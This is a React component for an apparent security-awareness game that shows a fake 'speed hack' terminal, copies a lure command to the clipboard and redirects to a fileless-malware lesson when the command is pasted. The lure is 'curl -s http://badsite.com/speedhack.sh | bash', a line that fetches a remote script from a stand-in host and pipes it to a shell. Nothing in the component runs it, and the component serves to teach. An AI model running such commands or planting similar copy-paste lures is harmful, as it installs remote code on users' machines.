import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './FakeTerminal.css';

const FakeTerminal = ({ onClose }) => {
  const navigate = useNavigate();
  const [input, setInput] = useState('');

  const commandToHack = 'curl -s http://badsite.com/speedhack.sh | bash';

  const handleCopy = () => {
    navigator.clipboard.writeText(commandToHack);
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const text = e.clipboardData.getData('text');
    setInput(text);
    if (text.includes('badsite.com')) {
      // They executed the fileless malware!
      setTimeout(() => navigate('/edu/fileless'), 500);
    }
  };

  return (
    <div className="terminal-container">
      <div className="terminal-header">
        <span>Bake_Speed_Hack_v2.exe</span>
        <button onClick={onClose} className="terminal-close">X</button>
      </div>
      <div className="terminal-body">
        <p className="terminal-instructions">
          Want to bake 50x faster? Copy and paste the command below into the terminal to unlock overdrive!
        </p>
        <div className="terminal-codebox">
          <code>{commandToHack}</code>
          <button className="copy-btn" onClick={handleCopy}>Copy</button>
        </div>
        <div className="terminal-input-area">
          <span>&gt;</span>
          <input 
            type="text" 
            value={input} 
            onChange={(e) => setInput(e.target.value)} 
            onPaste={handlePaste} 
            placeholder="Paste command here and press Enter..." 
          />
        </div>
      </div>
    </div>
  );
};

export default FakeTerminal;
